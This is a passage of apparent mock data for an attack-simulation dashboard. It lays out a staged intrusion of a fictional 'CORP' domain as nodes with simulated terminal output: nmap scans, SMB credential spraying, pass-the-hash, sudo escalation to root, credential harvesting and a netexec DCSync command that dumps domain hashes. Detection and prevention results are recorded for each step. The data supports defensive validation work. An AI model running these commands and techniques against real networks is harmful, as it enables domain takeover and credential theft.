      node_type: 'ACTION',
      node_label: 'Netexec LDAP DCSync',
      node_status: 'undetected',
      node_payload_name: 'netexec – LDAP DCSync (MS-DRSR GetNCChanges)',
      node_command: 'netexec ldap 10.10.3.5',
      node_arguments: '-u "corp\\da.svcadmin" -p "D0m@inAdm1n2024!" --ntds drsuapi',
      node_executed_at: '2025-03-22T07:38:51Z',
      node_agent: 'openaev',
      node_ip: '10.10.3.5',
      node_user_privileges: 'CORP\\Administrator (Domain Admin)',
      node_credentials_found: [
        'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a3f7c2e9b4d1a6f3c8e5b7d2a4f9c1e',
        'CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c4f8b2a9e3d7c5a2b6f4d8e1c9a3f7b',
        '284 domain accounts (full NTDS replication)',
      ],
      node_terminal_output: `LDAP  10.10.3.5    389    CORP-DC-01     [*] Connecting to CORP-DC-01 via LDAP (CORP\\da.svcadmin:D0m@inAdm1n2024!)
LDAP  10.10.3.5    389    CORP-DC-01     [+] Auth OK — Domain Admin privileges confirmed
LDAP  10.10.3.5    389    CORP-DC-01     [*] Initiating DCSync via MS-DRSR (GetNCChanges replication)
LDAP  10.10.3.5    389    CORP-DC-01     [*] Replicating partition: CN=Users,DC=CORP,DC=LOCAL
LDAP  10.10.3.5    389    CORP-DC-01     [+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a3f7c2e9b4d1a6f3c8e5b7d2a4f9c1e
LDAP  10.10.3.5    389    CORP-DC-01     [+] CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c4f8b2a9e3d7c5a2b6f4d8e1c9a3f7b
LDAP  10.10.3.5    389    CORP-DC-01     [+] CORP\\da.svcadmin:1104:aad3b435b51404eeaad3b435b51404ee:5f2b8d1c4a9e6f3b7d2c5a8e1f4b9d2c
LDAP  10.10.3.5    389    CORP-DC-01     [+] CORP\\svc_mssql:1107:aad3b435b51404eeaad3b435b51404ee:4a1c8f3d9b2e7a5c1d4f8b3e9c2a6f4d
LDAP  10.10.3.5    389    CORP-DC-01     [*] ... (280 more accounts) ...
LDAP  10.10.3.5    389    CORP-DC-01     [+] DCSync complete — 284 domain accounts replicated in 12.4s
[+] Golden Ticket material acquired (krbtgt: 8a3f7c2e9b4d1a6f3c8e5b7d2a4f9c1e)
[+] DOMAIN TAKEOVER COMPLETE — CORP.LOCAL fully compromised
[+] Pass-the-Hash available: Administrator 1c4f8b2a9e3d7c5a2b6f4d8e1c9a3f7b`,
    },

    // Phase 10 – Server VLAN nmap (discovers BACKUP-NAS-01, no attack)
    {
      node_id: 's4-a10',
      node_type: 'ACTION',
      node_label: 'Nmap Server VLAN Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP Connect Scan (Server VLAN)',
      node_executed_at: '2025-03-22T07:28:00Z',
      node_agent: 'openaev',
      node_ip: '10.10.2.0/24',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org ) at 2025-03-22 07:28 UTC
[*] Scanning Server VLAN range: 10.10.2.0/24

Nmap scan report for 10.10.2.20 (PRINT-SRV-02)
Host is up. Ports: 135,139,445,9100 — already targeted

Nmap scan report for 10.10.2.30 (MSSQL-SRV-01)
Host is up. 445/tcp open, 3389/tcp open, 1433/tcp filtered

Nmap scan report for 10.10.2.50
Host is up (0.0009s latency).
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.4p1
80/tcp   open  http      TrueNAS SCALE 23.10 WebUI
443/tcp  open  ssl/https TrueNAS SCALE 23.10 WebUI
111/tcp  open  rpcbind   2-4 (RPC #100000)
2049/tcp open  nfs       3-4 (RPC #100003)
OS details: Linux 5.15 (TrueNAS SCALE 23.10)

[+] NEW HOST DISCOVERED: BACKUP-NAS-01 (10.10.2.50) — TrueNAS SCALE 23.10
[+] NFS exports accessible, SMB shares likely present — high-value backup target
[*] NFS mount attempt deferred — prioritizing DC compromise path first
[*] BACKUP-NAS-01 logged for post-compromise exfiltration phase

Nmap done: 254 IP addresses (3 hosts up) scanned in 18.9 seconds`,
    },

    // Phase 11 – Corp LAN full discovery
    {
      node_id: 's4-a11',
      node_type: 'ACTION',
      node_label: 'Nmap Corp LAN Full Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan (Corp LAN)',
      node_executed_at: '2025-03-22T07:10:30Z',
      node_agent: 'openaev',
      node_ip: '10.10.1.0/24',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org ) at 2025-03-22 07:10 UTC
[*] Scanning Corp LAN range: 10.10.1.0/24

Nmap scan report for 10.10.1.50 (DEV-WS-01)
Host is up. Ports: 135,139,445,3389 — already compromised

Nmap scan report for 10.10.1.55 (SALES-WS-01)
Host is up. 445/tcp open — flagged DETECTED

Nmap scan report for 10.10.1.60 (IT-ADMIN-WS-01)
Host is up. 135,139,445,3389 — already targeted

Nmap scan report for 10.10.1.70
Host is up (0.0014s latency).
PORT      STATE SERVICE    VERSION
135/tcp   open  msrpc      Microsoft Windows RPC
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds Windows 10 SMB
3389/tcp  open  ms-wbt-server
OS details: Windows 10 (Build 19045, HR-WS-01)

Nmap scan report for 10.10.1.80
Host is up (0.0011s latency).
PORT      STATE SERVICE    VERSION
135/tcp   open  msrpc
445/tcp   open  microsoft-ds Windows 10 Pro SMB
3389/tcp  closed ms-wbt-server
OS details: Windows 10 Pro (Build 19044, FINANCE-WS-01)

Nmap scan report for 10.10.1.90
Host is up (0.0009s latency).
PORT      STATE SERVICE    VERSION
135/tcp   open  msrpc
445/tcp   open  microsoft-ds Windows 10 Enterprise
3389/tcp  filtered ms-wbt-server (EDR policy)
OS details: Windows 10 Enterprise (Build 19045, MGMT-WS-01)

Nmap scan report for 10.10.1.200
Host is up (0.0031s latency).
PORT     STATE SERVICE   VERSION
135/tcp  open  msrpc
445/tcp  open  microsoft-ds Windows 7 SP1
3389/tcp open  ms-wbt-server
OS details: Windows 7 SP1 (LEGACY-WIN-01) — EOL, no patches

Nmap scan report for 10.10.1.210
Host is up (0.0022s latency).
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4 (CentOS 7)
5060/tcp open  sip      Asterisk PBX 16.x (VOIP-GW-01)

[+] 7 hosts discovered in Corp LAN
[+] NEW: HR-WS-01 (10.10.1.70), FINANCE-WS-01 (10.10.1.80), MGMT-WS-01 (10.10.1.90)
[+] NEW: LEGACY-WIN-01 (10.10.1.200) — Windows 7 EOL, VOIP-GW-01 (10.10.1.210)
[*] Prioritizing SMB spray against HR, Finance, and MGMT workstations

Nmap done: 254 IP addresses (7 hosts up) scanned in 22.4 seconds`,
    },

    // Phase 12 – SMB spray against new Corp LAN targets
    {
      node_id: 's4-a12',
      node_type: 'ACTION',
      node_label: 'Netexec SMB Spray HR + Finance + MGMT',
      node_status: 'detected',
      node_payload_name: 'netexec – SMB credential spray (svc_tomcat)',
      node_executed_at: '2025-03-22T07:14:00Z',
      node_agent: 'openaev',
      node_ip: '10.10.1.70',
      node_hostname: 'HR-WS-01 + FINANCE-WS-01 + MGMT-WS-01',
      node_expectations: [
        {
          expectation_id: 's4e12',
          expectation_type: 'DETECTION',
          expectation_status: 'SUCCEEDED',
          expectation_score: 100,
          expectation_expected_score: 100,
        },
      ],
      node_terminal_output: `SMB  10.10.1.70  445  HR-WS-01       [*] Windows 10 (Build 19045) (name:HR-WS-01) (domain:CORP) (signing:False)
SMB  10.10.1.70  445  HR-WS-01       [+] CORP\\svc_tomcat:T0mc@tS3rv! (Pwn3d!)
SMB  10.10.1.70  445  HR-WS-01       [*] Executing command via SMBExec...
SMB  10.10.1.70  445  HR-WS-01       [!] ALERT: Microsoft Defender for Endpoint triggered — Lateral Movement detected
SMB  10.10.1.70  445  HR-WS-01       [!] SIEM alert: CORP-SIEM — rule "SMB_LMOVE_SPRAY" fired (severity: HIGH)
SMB  10.10.1.70  445  HR-WS-01       [-] Session terminated by EDR after partial access — STATUS: DETECTED

SMB  10.10.1.80  445  FINANCE-WS-01  [*] Windows 10 Pro (Build 19044) (name:FINANCE-WS-01) (domain:CORP)
SMB  10.10.1.80  445  FINANCE-WS-01  [+] CORP\\svc_tomcat:T0mc@tS3rv! (Pwn3d!)
SMB  10.10.1.80  445  FINANCE-WS-01  [+] Executing command — no EDR alert (Defender disabled on Finance hosts)
SMB  10.10.1.80  445  FINANCE-WS-01  [+] Local admin token obtained: CORP\\svc_finance
SMB  10.10.1.80  445  FINANCE-WS-01  [+] STATUS: UNDETECTED — pivoting via WMI

SMB  10.10.1.90  445  MGMT-WS-01     [*] Windows 10 Enterprise (Build 19045) (name:MGMT-WS-01) (domain:CORP)
SMB  10.10.1.90  445  MGMT-WS-01     [+] CORP\\svc_tomcat:T0mc@tS3rv! — auth OK
SMB  10.10.1.90  445  MGMT-WS-01     [!] CrowdStrike Falcon: process blocked — CreateRemoteThread injection denied
SMB  10.10.1.90  445  MGMT-WS-01     [!] CrowdStrike Falcon: execution PREVENTED — payload quarantined (hash: d41d8cd98f00b204e9800998ecf8427e)
SMB  10.10.1.90  445  MGMT-WS-01     [-] STATUS: PREVENTED — EDR blocked before any access

[*] Summary: HR-WS-01 DETECTED, FINANCE-WS-01 UNDETECTED (pivot), MGMT-WS-01 PREVENTED`,
    },

    // Phase 13 – WMI enumeration on FINANCE-WS-01
    {
      node_id: 's4-a13',
      node_type: 'ACTION',
      node_label: 'Netexec WMI Enum FINANCE-WS-01',
      node_status: 'undetected',
      node_payload_name: 'netexec – WMI command exec (FINANCE-WS-01)',
      node_executed_at: '2025-03-22T07:17:55Z',
      node_agent: 'sentinel_one',
      node_ip: '10.10.1.80',
      node_user_privileges: 'CORP\\svc_finance (local admin via token impersonation)',
      node_accessed_files: ['C:\\Finance\\YearEnd_2024.xlsx', 'C:\\Finance\\Payroll_Master.xlsx'],
      node_credentials_found: ['CORP\\svc_finance:F1nanc3@2024!'],
      node_terminal_output: `WMI  10.10.1.80  135  FINANCE-WS-01  [*] Windows 10 Pro (Build 19044) (name:FINANCE-WS-01) (domain:CORP)
WMI  10.10.1.80  135  FINANCE-WS-01  [+] CORP\\svc_finance — token impersonation successful (local admin)
WMI  10.10.1.80  135  FINANCE-WS-01  [*] Executing: whoami /priv
WMI  10.10.1.80  135  FINANCE-WS-01  [+] SeImpersonatePrivilege: Enabled
WMI  10.10.1.80  135  FINANCE-WS-01  [*] Executing: dir C:\\Finance\\ /s
WMI  10.10.1.80  135  FINANCE-WS-01  [+] C:\\Finance\\YearEnd_2024.xlsx  (2,847,392 bytes, modified 2025-03-15)
WMI  10.10.1.80  135  FINANCE-WS-01  [+] C:\\Finance\\Payroll_Master.xlsx  (1,203,874 bytes, modified 2025-03-20)
WMI  10.10.1.80  135  FINANCE-WS-01  [+] C:\\Finance\\Q1_Budget_2025.xlsx  (983,211 bytes)
WMI  10.10.1.80  135  FINANCE-WS-01  [*] Dumping credential vault (cmdkey /list)
WMI  10.10.1.80  135  FINANCE-WS-01  [+] Credential: CORP\\svc_finance:F1nanc3@2024! (Windows Credential Manager)
WMI  10.10.1.80  135  FINANCE-WS-01  [+] Files staged for exfil — total 4.9 MB
WMI  10.10.1.80  135  FINANCE-WS-01  [+] STATUS: UNDETECTED — no EDR on this host`,
    },

    // Phase 14 – SSH to APP-SRV-01
    {
      node_id: 's4-a14',
      node_type: 'ACTION',
      node_label: 'Netexec SSH APP-SRV-01 Exploit',
      node_status: 'undetected',
      node_payload_name: 'netexec – SSH credential spray (APP-SRV-01)',
      node_executed_at: '2025-03-22T07:25:40Z',
      node_agent: 'openaev',
      node_ip: '10.10.2.10',
      node_user_privileges: 'appuser → root',
      node_accessed_files: ['/opt/app/config/db.properties', '/opt/app/config/ldap.conf'],
      node_credentials_found: ['svc_webapp:W3bApp@Prod!', 'ldap_bind:L3ap@Corp2024'],
      node_terminal_output: `SSH  10.10.2.10  22  APP-SRV-01  [*] RHEL 8.6 (name:APP-SRV-01) SSH
SSH  10.10.2.10  22  APP-SRV-01  [*] Trying credentials from svc_webapp config leak...
SSH  10.10.2.10  22  APP-SRV-01  [+] appuser:W3bApp@Prod! — auth OK
SSH  10.10.2.10  22  APP-SRV-01  [*] Executing: sudo -l
SSH  10.10.2.10  22  APP-SRV-01  [+] (ALL) NOPASSWD: ALL — sudo misconfiguration confirmed
SSH  10.10.2.10  22  APP-SRV-01  [+] Executing: sudo su -
SSH  10.10.2.10  22  APP-SRV-01  [+] ROOT SHELL OBTAINED
SSH  10.10.2.10  22  APP-SRV-01  [*] cat /opt/app/config/db.properties
SSH  10.10.2.10  22  APP-SRV-01  [+] db.url=jdbc:mssql://10.10.2.30:1433/CORPDB
SSH  10.10.2.10  22  APP-SRV-01  [+] db.username=svc_webapp  db.password=W3bApp@Prod!
SSH  10.10.2.10  22  APP-SRV-01  [*] cat /opt/app/config/ldap.conf
SSH  10.10.2.10  22  APP-SRV-01  [+] bindDN=cn=ldap_bind,dc=CORP,dc=LOCAL  bindPassword=L3ap@Corp2024
SSH  10.10.2.10  22  APP-SRV-01  [+] Credentials harvested: svc_webapp:W3bApp@Prod!, ldap_bind:L3ap@Corp2024
SSH  10.10.2.10  22  APP-SRV-01  [+] STATUS: UNDETECTED — no agent on RHEL host`,
    },

    // Phase 15 – SMB to FILE-SRV-01 (detected)
    {
      node_id: 's4-a15',
      node_type: 'ACTION',
      node_label: 'Netexec SMB FILE-SRV-01 Access',
      node_status: 'detected',
      node_payload_name: 'netexec – SMB file share access (FILE-SRV-01)',
      node_executed_at: '2025-03-22T07:26:55Z',
      node_agent: 'sentinel_one',
      node_ip: '10.10.2.40',
      node_expectations: [
        {
          expectation_id: 's4e15',
          expectation_type: 'DETECTION',
          expectation_status: 'SUCCEEDED',
          expectation_score: 100,
          expectation_expected_score: 100,
        },
      ],
      node_terminal_output: `SMB  10.10.2.40  445  FILE-SRV-01  [*] Windows Server 2019 (Build 17763) (name:FILE-SRV-01) (domain:CORP)
SMB  10.10.2.40  445  FILE-SRV-01  [+] CORP\\svc_finance:F1nanc3@2024! — auth OK (Pwn3d! partial)
SMB  10.10.2.40  445  FILE-SRV-01  [*] Enumerating shares...
SMB  10.10.2.40  445  FILE-SRV-01  [+] Share: FINANCE_ARCHIVE  (READ access)
SMB  10.10.2.40  445  FILE-SRV-01  [+] Share: HR_RECORDS  (READ access — svc_finance over-permissioned)
SMB  10.10.2.40  445  FILE-SRV-01  [*] Recursively listing FINANCE_ARCHIVE...
SMB  10.10.2.40  445  FILE-SRV-01  [+] 2,847 files found — initiating bulk read
SMB  10.10.2.40  445  FILE-SRV-01  [!] DLP ALERT: Varonis — bulk read pattern detected (>500 files in 30s)
SMB  10.10.2.40  445  FILE-SRV-01  [!] SIEM: CORP-SIEM rule FILE_MASS_READ fired (severity: CRITICAL)
SMB  10.10.2.40  445  FILE-SRV-01  [!] Network ACL: FILE-SRV-01 access from 10.10.1.80 blocked post-alert
SMB  10.10.2.40  445  FILE-SRV-01  [-] STATUS: DETECTED — session terminated before full exfil`,
    },

    // Phase 16 – Redis access attempt (prevented)
    {
      node_id: 's4-a16',
      node_type: 'ACTION',
      node_label: 'Netexec Redis Unauthorized Access',
      node_status: 'prevented',
      node_payload_name: 'netexec – Redis unauthenticated access attempt',
      node_executed_at: '2025-03-22T07:27:45Z',
      node_agent: 'sentinel_one',
      node_ip: '10.10.2.60',
      node_expectations: [
        {
          expectation_id: 's4e16',
          expectation_type: 'PREVENTION',
          expectation_status: 'SUCCEEDED',
          expectation_score: 100,
          expectation_expected_score: 100,
        },
      ],
      node_terminal_output: `REDIS  10.10.2.60  6379  REDIS-CACHE-01  [*] Attempting Redis unauthenticated access...
REDIS  10.10.2.60  6379  REDIS-CACHE-01  [-] Connection refused — TCP/6379 not reachable
REDIS  10.10.2.60  6379  REDIS-CACHE-01  [*] Trying alternative port 16379...
REDIS  10.10.2.60  6379  REDIS-CACHE-01  [-] Connection refused — TCP/16379 not reachable
[!] FIREWALL: FW-RULE-211 — DROP tcp 10.10.1.0/24 → 10.10.2.60:6379 (Redis internal access policy)
[!] FIREWALL: FW-RULE-211 — DROP tcp 10.10.2.0/24 → 10.10.2.60:6379 (inter-VLAN Redis isolation)
[-] STATUS: PREVENTED — network-level firewall rule blocks Redis port from all unauthorized subnets
[-] No lateral movement possible via Redis cache on this network segment`,
    },

    // Phase 16b – Domain Subnet Recon
    {
      node_id: 's4-a16b',
      node_type: 'ACTION',
      node_label: 'Nmap Domain Subnet Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan (Domain subnet)',
      node_executed_at: '2025-03-22T07:33:00Z',
      node_agent: 'openaev',
      node_ip: '10.10.3.0/24',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org ) at 2025-03-22 07:33 UTC
Nmap scan report for 10.10.3.5 (CORP-DC-01)
Host is up (0.0008s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds  Windows Server 2022 microsoft-ds (workgroup: CORP)
636/tcp  open  ldapssl       Microsoft Windows AD LDAP (SSL)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3389/tcp filtered ms-wbt-server
OS details: Windows Server 2022 Build 20348 (Domain Controller)

Nmap scan report for 10.10.3.10 (JUMP-SRV-01)
Host is up (0.0009s latency).
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_8.1
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 microsoft-ds (workgroup: CORP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services

Nmap done: 254 IP addresses (2 hosts up) scanned in 17.8 seconds`,
    },

    // Phase 17 – Pass-the-hash to JUMP-SRV-01
    {
      node_id: 's4-a17',
      node_type: 'ACTION',
      node_label: 'Netexec SMB JUMP-SRV-01 Pivot',
      node_status: 'undetected',
      node_payload_name: 'netexec – SMB pass-the-hash (JUMP-SRV-01)',
      node_executed_at: '2025-03-22T07:35:22Z',
      node_agent: 'palo_alto',
      node_ip: '10.10.3.10',
      node_user_privileges: 'CORP\\svc_jumphost → SYSTEM',
      node_accessed_files: ['C:\\JumpAdmin\\bastion_creds_vault.txt'],
      node_credentials_found: ['CORP\\da.svcadmin:D0m@inAdm1n2024!'],
      node_terminal_output: `SMB  10.10.3.10  445  JUMP-SRV-01  [*] Windows Server 2019 (Build 17763) (name:JUMP-SRV-01) (domain:CORP)
SMB  10.10.3.10  445  JUMP-SRV-01  [*] Pass-the-hash using PRINT-SRV-02 SYSTEM hash...
SMB  10.10.3.10  445  JUMP-SRV-01  [+] CORP\\svc_jumphost:aad3b435b51404eeaad3b435b51404ee:7c3d2e8f1a5b9c4d6e2f7a3b8d1c5e9f (Pwn3d!)
SMB  10.10.3.10  445  JUMP-SRV-01  [+] Impersonating SYSTEM via token duplication
SMB  10.10.3.10  445  JUMP-SRV-01  [*] Executing: dir C:\\JumpAdmin\\ /s
SMB  10.10.3.10  445  JUMP-SRV-01  [+] C:\\JumpAdmin\\bastion_creds_vault.txt  (4,218 bytes, modified 2025-03-01)
SMB  10.10.3.10  445  JUMP-SRV-01  [*] Reading credential vault...
SMB  10.10.3.10  445  JUMP-SRV-01  [+] Entry: CORP\\da.svcadmin:D0m@inAdm1n2024! — plaintext backup (!)
SMB  10.10.3.10  445  JUMP-SRV-01  [+] Entry: CORP\\sa.backup:B@ckupS3rv2024 — backup SA account
SMB  10.10.3.10  445  JUMP-SRV-01  [+] Entry: local_admin:L0c@lAdm1n! — shared local admin
SMB  10.10.3.10  445  JUMP-SRV-01  [+] DOMAIN ADMIN CREDENTIALS CONFIRMED in plaintext
SMB  10.10.3.10  445  JUMP-SRV-01  [+] STATUS: UNDETECTED — converging on CORP-DC-01`,
    },

    // Phase 18 – OT pivot attempt from DC (prevented)
    {
      node_id: 's4-a18',
      node_type: 'ACTION',
      node_label: 'Netexec WMI MONITORING-01 OT Pivot Attempt',
      node_status: 'prevented',
      node_payload_name: 'netexec – WMI OT segment access attempt',
      node_executed_at: '2025-03-22T07:40:10Z',
      node_agent: 'openaev',
      node_ip: '10.10.4.10',
      node_expectations: [
        {
          expectation_id: 's4e18',
          expectation_type: 'PREVENTION',
          expectation_status: 'SUCCEEDED',
          expectation_score: 100,
          expectation_expected_score: 100,
        },
      ],
      node_terminal_output: `WMI  10.10.4.10  135  MONITORING-01  [*] Attempting WMI connection from CORP-DC-01 (10.10.3.5)...
WMI  10.10.4.10  135  MONITORING-01  [-] Connection timed out — TCP/135 not reachable from Domain subnet
[!] FIREWALL: OT-ISOLATION-01 — DENY ALL tcp 10.10.2.0/24 → 10.10.4.0/24 (OT isolation policy)
[!] FIREWALL: OT-ISOLATION-01 — DENY ALL tcp 10.10.3.0/24 → 10.10.4.0/24 (OT isolation policy)
[!] Next-Gen Firewall: Zero Trust OT segmentation enforced — no lateral movement permitted into OT/Monitoring
[*] Attempting ICMP ping to 10.10.4.10...
[-] Request timeout — ICMP also blocked by OT-ISOLATION-01
[*] Attempting SSH (TCP/22) to 10.10.4.10...
[-] Connection refused — TCP/22 blocked
[-] STATUS: PREVENTED — OT segment fully isolated from Corp/Server/Domain VLANs
[-] OT network segmentation validated — no path to MONITORING-01 or ARCHIVE-SRV-01`,
    },

    // Phase 19 – DCSync on SECONDARY-DC-01
    {
      node_id: 's4-a19',
      node_type: 'ACTION',
      node_label: 'Netexec LDAP DCSync SECONDARY-DC-01',
      node_status: 'undetected',
      node_payload_name: 'netexec – LDAP DCSync (SECONDARY-DC-01 confirmation)',
      node_executed_at: '2025-03-22T07:43:18Z',
      node_agent: 'openaev',
      node_ip: '10.10.3.6',
      node_user_privileges: 'CORP\\Administrator (Domain Admin)',
      node_credentials_found: ['All CORP domain accounts replicated from SECONDARY-DC-01'],
      node_terminal_output: `LDAP  10.10.3.6    389    SECONDARY-DC-01  [*] Connecting via LDAP (CORP\\da.svcadmin:D0m@inAdm1n2024!)
LDAP  10.10.3.6    389    SECONDARY-DC-01  [+] Auth OK — Domain Admin confirmed on secondary DC
LDAP  10.10.3.6    389    SECONDARY-DC-01  [*] Initiating DCSync via MS-DRSR (GetNCChanges replication)
LDAP  10.10.3.6    389    SECONDARY-DC-01  [*] Replicating partition: CN=Users,DC=CORP,DC=LOCAL
LDAP  10.10.3.6    389    SECONDARY-DC-01  [+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a3f7c2e9b4d1a6f3c8e5b7d2a4f9c1e
LDAP  10.10.3.6    389    SECONDARY-DC-01  [+] CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c4f8b2a9e3d7c5a2b6f4d8e1c9a3f7b
LDAP  10.10.3.6    389    SECONDARY-DC-01  [+] CORP\\da.svcadmin:1104:aad3b435b51404eeaad3b435b51404ee:5f2b8d1c4a9e6f3b7d2c5a8e1f4b9d2c
LDAP  10.10.3.6    389    SECONDARY-DC-01  [*] ... (281 more accounts) ...
LDAP  10.10.3.6    389    SECONDARY-DC-01  [+] DCSync complete — 284 domain accounts replicated (matches primary DC)
[+] SECONDARY DC CONFIRMED — same krbtgt hash, identical replication state
[+] Golden Ticket material validated on both DCs — CORP.LOCAL fully under attacker control
[+] STATUS: UNDETECTED — domain-wide compromise confirmed`,
    },
  ],

  attack_path_edges: [
    // ── chain_flow edges ─────────────────────────────────────────────────────
    { edge_id: 's4-c01', edge_source: 's4-a01', edge_target: 's4-a02', edge_type: 'chain_flow' },
    { edge_id: 's4-c02', edge_source: 's4-a02', edge_target: 's4-a03', edge_type: 'chain_flow', edge_label: 'foothold → internal recon' },
    { edge_id: 's4-c03', edge_source: 's4-a03', edge_target: 's4-a04', edge_type: 'chain_flow', edge_label: 'credential reuse' },
    { edge_id: 's4-c04', edge_source: 's4-a04', edge_target: 's4-a05', edge_type: 'chain_flow', edge_label: 'pivot DEV-WS-01' },
    { edge_id: 's4-c05', edge_source: 's4-a05', edge_target: 's4-a06', edge_type: 'chain_flow', edge_label: 'PrintNightmare branch' },
    { edge_id: 's4-c06', edge_source: 's4-a05', edge_target: 's4-a07', edge_type: 'chain_flow', edge_label: 'MSSQL attempt' },
    { edge_id: 's4-c07', edge_source: 's4-a05', edge_target: 's4-a08', edge_type: 'chain_flow', edge_label: 'IT admin branch' },
    { edge_id: 's4-c08', edge_source: 's4-a06', edge_target: 's4-a09', edge_type: 'chain_flow', edge_label: 'SYSTEM → DC' },
    { edge_id: 's4-c09', edge_source: 's4-a08', edge_target: 's4-a09', edge_type: 'chain_flow', edge_label: 'DA creds → DC' },
    { edge_id: 's4-c10', edge_source: 's4-a03', edge_target: 's4-a10', edge_type: 'chain_flow', edge_label: 'Server VLAN scan' },

    // ── asset_link edges (action → target endpoint) ───────────────────────────
    { edge_id: 's4-l01', edge_source: 's4-a01', edge_target: 's4-ep01', edge_type: 'asset_link' },
    { edge_id: 's4-l01b', edge_source: 's4-a01b', edge_target: 's4-ep02', edge_type: 'asset_link' },
    { edge_id: 's4-l02', edge_source: 's4-a02', edge_target: 's4-ep01', edge_type: 'asset_link' },
    { edge_id: 's4-l03', edge_source: 's4-a03', edge_target: 's4-ep02', edge_type: 'asset_link' },
    { edge_id: 's4-l04a', edge_source: 's4-a04', edge_target: 's4-ep02', edge_type: 'asset_link' },
    { edge_id: 's4-l04b', edge_source: 's4-a04', edge_target: 's4-ep03', edge_type: 'asset_link' },
    { edge_id: 's4-l05', edge_source: 's4-a05', edge_target: 's4-ep02', edge_type: 'asset_link' },
    { edge_id: 's4-l06', edge_source: 's4-a06', edge_target: 's4-ep05', edge_type: 'asset_link' },
    { edge_id: 's4-l07', edge_source: 's4-a07', edge_target: 's4-ep06', edge_type: 'asset_link' },
    { edge_id: 's4-l08', edge_source: 's4-a08', edge_target: 's4-ep04', edge_type: 'asset_link' },
    { edge_id: 's4-l09', edge_source: 's4-a09', edge_target: 's4-ep07', edge_type: 'asset_link' },
    { edge_id: 's4-l10', edge_source: 's4-a10', edge_target: 's4-ep08', edge_type: 'asset_link' },
    { edge_id: 's4-l10b', edge_source: 's4-a10', edge_target: 's4-ep05', edge_type: 'asset_link' },

    // ── discovery edge (ep01 discovered BACKUP-NAS-01 but no attack launched) ─
    { edge_id: 's4-disc01', edge_source: 's4-ep01', edge_target: 's4-ep08', edge_type: 'discovery', edge_label: 'nmap discovered, not attacked' },

    // ── additional chain_flow edges ───────────────────────────────────────────
    { edge_id: 's4-c11', edge_source: 's4-a03', edge_target: 's4-a11', edge_type: 'chain_flow', edge_label: 'parallel internal discovery' },
    { edge_id: 's4-c12', edge_source: 's4-a11', edge_target: 's4-a12', edge_type: 'chain_flow', edge_label: 'Corp LAN spread' },
    { edge_id: 's4-c13', edge_source: 's4-a12', edge_target: 's4-a13', edge_type: 'chain_flow', edge_label: 'FINANCE pivot' },
    { edge_id: 's4-c14', edge_source: 's4-a11', edge_target: 's4-a14', edge_type: 'chain_flow', edge_label: 'App server pivot via web creds' },
    { edge_id: 's4-c15', edge_source: 's4-a14', edge_target: 's4-a15', edge_type: 'chain_flow', edge_label: 'FILE-SRV via svc_finance creds from app config' },
    { edge_id: 's4-c16', edge_source: 's4-a14', edge_target: 's4-a16', edge_type: 'chain_flow', edge_label: 'Redis attempt' },
    { edge_id: 's4-c17', edge_source: 's4-a06', edge_target: 's4-a17', edge_type: 'chain_flow', edge_label: 'JUMP-SRV pivot from PRINT-SRV-02 SYSTEM' },
    { edge_id: 's4-c18', edge_source: 's4-a17', edge_target: 's4-a09', edge_type: 'chain_flow', edge_label: 'JUMP-SRV → DC via DA creds' },
    { edge_id: 's4-c19', edge_source: 's4-a09', edge_target: 's4-a18', edge_type: 'chain_flow', edge_label: 'OT pivot attempt post-DC' },
    { edge_id: 's4-c20', edge_source: 's4-a09', edge_target: 's4-a19', edge_type: 'chain_flow', edge_label: 'DCSync secondary DC' },

    // ── additional asset_link edges ───────────────────────────────────────────
    { edge_id: 's4-l11', edge_source: 's4-a11', edge_target: 's4-ep09', edge_type: 'asset_link' },
    { edge_id: 's4-l12', edge_source: 's4-a11', edge_target: 's4-ep10', edge_type: 'asset_link' },
    { edge_id: 's4-l13', edge_source: 's4-a11', edge_target: 's4-ep11', edge_type: 'asset_link' },
    { edge_id: 's4-l14', edge_source: 's4-a12', edge_target: 's4-ep09', edge_type: 'asset_link' },
    { edge_id: 's4-l15', edge_source: 's4-a12', edge_target: 's4-ep10', edge_type: 'asset_link' },
    { edge_id: 's4-l16', edge_source: 's4-a12', edge_target: 's4-ep11', edge_type: 'asset_link' },
    { edge_id: 's4-l17', edge_source: 's4-a13', edge_target: 's4-ep10', edge_type: 'asset_link' },
    { edge_id: 's4-l18', edge_source: 's4-a14', edge_target: 's4-ep12', edge_type: 'asset_link' },
    { edge_id: 's4-l19', edge_source: 's4-a15', edge_target: 's4-ep13', edge_type: 'asset_link' },
    { edge_id: 's4-l20', edge_source: 's4-a16', edge_target: 's4-ep14', edge_type: 'asset_link' },
    { edge_id: 's4-l21', edge_source: 's4-a17', edge_target: 's4-ep15', edge_type: 'asset_link' },
    { edge_id: 's4-l16b', edge_source: 's4-a16b', edge_target: 's4-ep15', edge_type: 'asset_link' },
    { edge_id: 's4-l16c', edge_source: 's4-a16b', edge_target: 's4-ep07', edge_type: 'asset_link' },
    { edge_id: 's4-l22', edge_source: 's4-a18', edge_target: 's4-ep17', edge_type: 'asset_link' },
    { edge_id: 's4-l23', edge_source: 's4-a19', edge_target: 's4-ep16', edge_type: 'asset_link' },

